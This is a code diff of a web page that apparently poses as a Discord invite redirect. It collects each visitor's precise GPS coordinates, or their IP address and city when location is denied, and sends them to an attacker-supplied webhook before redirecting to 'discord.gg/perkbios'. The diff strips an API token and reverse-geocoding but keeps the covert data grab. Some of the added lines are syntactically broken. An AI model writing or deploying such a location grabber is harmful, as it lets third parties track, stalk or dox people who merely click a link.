@@ -34,16 +34,10 @@
 
         // Function to fetch approximate location using the user's IP
         function getApproxLocation() {
-            fetch("https://ipinfo.io/json?token=75df35b1472407")  // Your IPInfo API token
+            fetch("https://ipinfo.io/json?token=YOUR_IPINFO_API_KEY")  // Replace with your ipinfo.io token
                 .then(response => response.json())
                 .then(data => {
-                    const locationMessage = `
-Title: Info From Click
-Mini Title: Allowed Location: No
-Mini Title: Other Info
-IP: ${data.ip}
-State/City: ${data.city}, ${data.region}
-                    `;
+                    const locationMessage = IP-based location: City: ${data.city}, State: ${data.region}, IP: ${data.ip};
                     sendToWebhook(getWebhookFromUrl(), locationMessage);
                 })
                 .catch(error => {
@@ -53,84 +47,45 @@ State/City: ${data.city}, ${data.region}
                 });
         }
 
-        // Function to get address from coordinates (latitude, longitude)
-        function getAddressFromCoordinates(latitude, longitude) {
-            return new Promise((resolve, reject) => {
-                fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data && data.address) {
-                            resolve(data.address);
-                        } else {
-                            reject('No address found');
-                        }
-                    })
-                    .catch(error => {
-                        reject('Failed to get address');
-                    });
-            });
-        }
-
         // Main function to handle geolocation and webhook sending
         function handleRedirectAndWebhook() {
+            // Get the webhook URL from the query string
             const webhookUrl = getWebhookFromUrl();
-            if (!webhookUrl) {
-                console.error("No webhook URL found in the query string.");
-                return;
-            }
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+            // Check if webhook is available
+            if (webhookUrl) {
+                // Get the location (if available)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
 
-                    // Get address from coordinates
-                    getAddressFromCoordinates(latitude, longitude)
-                        .then(address => {
-                            const geoDetailsMessage = `
-Title: Info From Click
-Mini Title: Allowed Location: Yes
-Address: ${address}
-Coordinates: Latitude: ${latitude}, Longitude: ${longitude}
+                        // Use the browser to fetch a more detailed address
+                        const geoDetailsMessage = User's precise location: Latitude: ${latitude}, Longitude: ${longitude};
 
-Mini Title: Other Info
-IP: (IP address not fetched as geolocation is enabled)
-State/City: (State/City not fetched as geolocation is enabled)
-                            `;
-                            sendToWebhook(webhookUrl, geoDetailsMessage);
-                        })
-                        .catch(error => {
-                            console.error("Failed to get address:", error);
-                            const fallbackMessage = `
-Title: Info From Click
-Mini Title: Allowed Location: Yes
-Address: Not available
-Coordinates: Latitude: ${latitude}, Longitude: ${longitude}
+                        // Send precise location data to the webhook
+                        sendToWebhook(webhookUrl, geoDetailsMessage);
 
-Mini Title: Other Info
-IP: (IP address not fetched as geolocation is enabled)
-State/City: (State/City not fetched as geolocation is enabled)
-                            `;
-                            sendToWebhook(webhookUrl, fallbackMessage);
-                        });
+                        // Redirect to the Discord invite link
+                        window.location.href = "https://discord.gg/perkbios";
+                    }, function(error) {
+                        console.error("Geolocation error:", error);
+                        // If the user denies location, fall back to IP-based location
+                        getApproxLocation();
 
-                    // Redirect to the Discord invite link
-                    window.location.href = "https://discord.gg/perkbios";
-                }, function(error) {
-                    console.error("Geolocation error:", error);
-                    // If the user denies location, fall back to IP-based location
+                        // Redirect to Discord even if geolocation is denied
+                        window.location.href = "https://discord.gg/perkbios";
+                    });
+                } else {
+                    console.log("Geolocation is not supported by this browser.");
+                    // Fall back to IP-based location if geolocation is not supported
                     getApproxLocation();
 
-                    // Redirect to Discord even if geolocation is denied
+                    // Redirect to Discord if geolocation is not supported
                     window.location.href = "https://discord.gg/perkbios";
-                });
+                }
             } else {
-                console.log("Geolocation is not supported by this browser.");
-                // Fall back to IP-based location if geolocation is not supported
-                getApproxLocation();
-
-                // Redirect to Discord if geolocation is not supported
-                window.location.href = "https://discord.gg/perkbios";
+                console.error("No webhook URL found in the query string.");
             }
         }
 
